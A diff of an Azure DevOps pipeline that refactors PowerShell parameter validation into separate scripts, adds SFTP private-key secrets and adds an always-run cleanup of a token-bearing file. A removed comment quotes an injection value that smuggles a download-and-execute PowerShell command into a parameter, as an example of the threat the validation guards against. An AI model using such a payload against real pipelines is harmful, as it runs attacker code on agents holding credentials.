@@ -68,69 +68,22 @@ steps:
   - powershell: |
       $ErrorActionPreference = 'Stop'
 
-      # Queue-time parameters reach this script as environment variables, never as a
-      # template expression inside the script body. A template expression is expanded
-      # at compile time, so a free-text parameter is pasted in as SOURCE CODE. A
-      # value of
-      #     x'; iwr http://host/payload.ps1 | iex; '
-      # closed the quoting and ran on the agent, in a job holding ADO_PAT and the
-      # connection credentials. Reading $env: keeps the value data.
+      # The validator and the file writer live in scripts/pipeline/ rather than inline
+      # here. They are an injection control, and inline in YAML is the one place in this
+      # repository the parse check, PSScriptAnalyzer and Pester all skip - so the same
+      # fifty lines sat triplicated across three files with nothing checking that the
+      # copies still agreed.
       #
-      # The single-line check is the second half. Even as data, a value carrying a
-      # newline would append arbitrary KEY=VALUE lines to the environment file below -
-      # enough to override ADO_PAT or inject a credential.
-      function Assert-ParameterValue {
-        param(
-          [Parameter(Mandatory)] [string] $Name,
-          [AllowEmptyString()] [string] $Value,
-          [switch] $Required,
-          [string] $Pattern
-        )
-
-        if ([string]::IsNullOrWhiteSpace($Value)) {
-          if ($Required) { throw "Parameter '$Name' is required and arrived empty." }
-          return ''
-        }
-        # Character codes rather than an escape sequence: this text passes through a
-        # YAML block scalar, and a backslash escape in that position is easy to mangle.
-        if ($Value.IndexOfAny([char[]]@([char]13, [char]10)) -ge 0) {
-          throw "Parameter '$Name' contains a line break, which would inject extra variables into the environment file."
-        }
-
-        $trimmed = $Value.Trim()
-        if ($Pattern -and $trimmed -notmatch $Pattern) {
-          throw "Parameter '$Name' has value '$trimmed', which does not match the expected form $Pattern."
-        }
-        return $trimmed
-      }
-
-      $organizationUrl = Assert-ParameterValue -Name 'organizationUrl' -Value $env:PARAM_ORGANIZATION_URL -Required `
-        -Pattern '^https://[A-Za-z0-9][A-Za-z0-9.-]*/[A-Za-z0-9._~%-]+$'
-      $project = Assert-ParameterValue -Name 'project' -Value $env:PARAM_PROJECT -Required `
-        -Pattern '^[A-Za-z0-9][A-Za-z0-9 ._-]*$'
-
-      $lines = @(
-        "ADO_ORG_URL=$organizationUrl",
-        "ADO_PROJECT=$project",
-        "ADO_PAT=$env:ADO_PAT"
-      )
-
-      # Only the credential variables that actually have a value. A connection with
-      # no credential available is created with the configuration sentinel and handed
-      # to its owner, which is a normal, expected outcome rather than a failure.
-      foreach ($name in @(
-        'SFTP_APP_ALPHA_DEV_HOST', 'SFTP_APP_ALPHA_DEV_USERNAME', 'SFTP_APP_ALPHA_DEV_PASSWORD',
-        'SFTP_APP_ALPHA_QA_HOST', 'SFTP_APP_ALPHA_QA_USERNAME', 'SFTP_APP_ALPHA_QA_PASSWORD',
-        'SFTP_APP_ALPHA_PROD_HOST', 'SFTP_APP_ALPHA_PROD_USERNAME', 'SFTP_APP_ALPHA_PROD_PASSWORD',
-        'SFTP_APP_BETA_DEV_HOST', 'SFTP_APP_BETA_DEV_USERNAME', 'SFTP_APP_BETA_DEV_PASSWORD',
-        'SFTP_APP_BETA_QA_HOST', 'SFTP_APP_BETA_QA_USERNAME', 'SFTP_APP_BETA_QA_PASSWORD'
-      )) {
-        $value = [Environment]::GetEnvironmentVariable($name)
-        if ($value) { $lines += "$name=$value" }
-      }
-
-      $lines | Set-Content -LiteralPath .env.pipeline -Encoding UTF8
-      Write-Host "Wrote .env.pipeline with $($lines.Count) variable(s). Values are not echoed."
+      # Queue-time parameters still arrive as environment variables and are passed on as
+      # arguments, never interpolated as a template expression into a script body: a
+      # template expression is expanded at compile time, so a free-text parameter is
+      # pasted in as SOURCE CODE. Secrets are NOT passed as arguments - the script reads
+      # them from this step's environment, because a command line is visible to every
+      # other process on the agent.
+      .\scripts\pipeline\Write-EnvironmentFile.ps1 -Path .env.pipeline `
+        -OrganizationUrl $env:PARAM_ORGANIZATION_URL `
+        -Project $env:PARAM_PROJECT `
+        -SecretName 'SFTP_APP_ALPHA_DEV_HOST', 'SFTP_APP_ALPHA_DEV_USERNAME', 'SFTP_APP_ALPHA_DEV_PASSWORD', 'SFTP_APP_ALPHA_DEV_PRIVATE_KEY', 'SFTP_APP_ALPHA_QA_HOST', 'SFTP_APP_ALPHA_QA_USERNAME', 'SFTP_APP_ALPHA_QA_PASSWORD', 'SFTP_APP_ALPHA_QA_PRIVATE_KEY', 'SFTP_APP_ALPHA_PROD_HOST', 'SFTP_APP_ALPHA_PROD_USERNAME', 'SFTP_APP_ALPHA_PROD_PASSWORD', 'SFTP_APP_ALPHA_PROD_PRIVATE_KEY', 'SFTP_APP_BETA_DEV_HOST', 'SFTP_APP_BETA_DEV_USERNAME', 'SFTP_APP_BETA_DEV_PASSWORD', 'SFTP_APP_BETA_DEV_PRIVATE_KEY', 'SFTP_APP_BETA_QA_HOST', 'SFTP_APP_BETA_QA_USERNAME', 'SFTP_APP_BETA_QA_PASSWORD', 'SFTP_APP_BETA_QA_PRIVATE_KEY'
     displayName: Materialise the environment file
     env:
       ADO_PAT: $(ADO_PAT)
@@ -139,18 +92,23 @@ steps:
       SFTP_APP_ALPHA_DEV_HOST: $(SFTP_APP_ALPHA_DEV_HOST)
       SFTP_APP_ALPHA_DEV_USERNAME: $(SFTP_APP_ALPHA_DEV_USERNAME)
       SFTP_APP_ALPHA_DEV_PASSWORD: $(SFTP_APP_ALPHA_DEV_PASSWORD)
+      SFTP_APP_ALPHA_DEV_PRIVATE_KEY: $(SFTP_APP_ALPHA_DEV_PRIVATE_KEY)
       SFTP_APP_ALPHA_QA_HOST: $(SFTP_APP_ALPHA_QA_HOST)
       SFTP_APP_ALPHA_QA_USERNAME: $(SFTP_APP_ALPHA_QA_USERNAME)
       SFTP_APP_ALPHA_QA_PASSWORD: $(SFTP_APP_ALPHA_QA_PASSWORD)
+      SFTP_APP_ALPHA_QA_PRIVATE_KEY: $(SFTP_APP_ALPHA_QA_PRIVATE_KEY)
       SFTP_APP_ALPHA_PROD_HOST: $(SFTP_APP_ALPHA_PROD_HOST)
       SFTP_APP_ALPHA_PROD_USERNAME: $(SFTP_APP_ALPHA_PROD_USERNAME)
       SFTP_APP_ALPHA_PROD_PASSWORD: $(SFTP_APP_ALPHA_PROD_PASSWORD)
+      SFTP_APP_ALPHA_PROD_PRIVATE_KEY: $(SFTP_APP_ALPHA_PROD_PRIVATE_KEY)
       SFTP_APP_BETA_DEV_HOST: $(SFTP_APP_BETA_DEV_HOST)
       SFTP_APP_BETA_DEV_USERNAME: $(SFTP_APP_BETA_DEV_USERNAME)
       SFTP_APP_BETA_DEV_PASSWORD: $(SFTP_APP_BETA_DEV_PASSWORD)
+      SFTP_APP_BETA_DEV_PRIVATE_KEY: $(SFTP_APP_BETA_DEV_PRIVATE_KEY)
       SFTP_APP_BETA_QA_HOST: $(SFTP_APP_BETA_QA_HOST)
       SFTP_APP_BETA_QA_USERNAME: $(SFTP_APP_BETA_QA_USERNAME)
       SFTP_APP_BETA_QA_PASSWORD: $(SFTP_APP_BETA_QA_PASSWORD)
+      SFTP_APP_BETA_QA_PRIVATE_KEY: $(SFTP_APP_BETA_QA_PRIVATE_KEY)
 
   - powershell: |
       $ErrorActionPreference = 'Stop'
@@ -198,6 +156,16 @@ steps:
       PARAM_APPLICATION_KEY: ${{ parameters.applicationKey }}
       PARAM_ENVIRONMENT: ${{ parameters.environment }}
       PARAM_CONFIRM_APPLY: ${{ parameters.confirmApply }}
+
+  - powershell: |
+      $ErrorActionPreference = 'Stop'
+      .\scripts\pipeline\Remove-EnvironmentFile.ps1 -Path .env.pipeline
+    displayName: Remove the environment file
+    # always(), and before the publish step. The file holds ADO_PAT in clear text, and
+    # on a self-hosted agent - the case this repository exists for - the workspace
+    # survives the run, so a missing cleanup leaves the token on disk between builds.
+    # The run this matters most for is the one that threw.
+    condition: always()
 
   - publish: artifacts
     artifact: service-connection-provisioning-$(Build.BuildId)
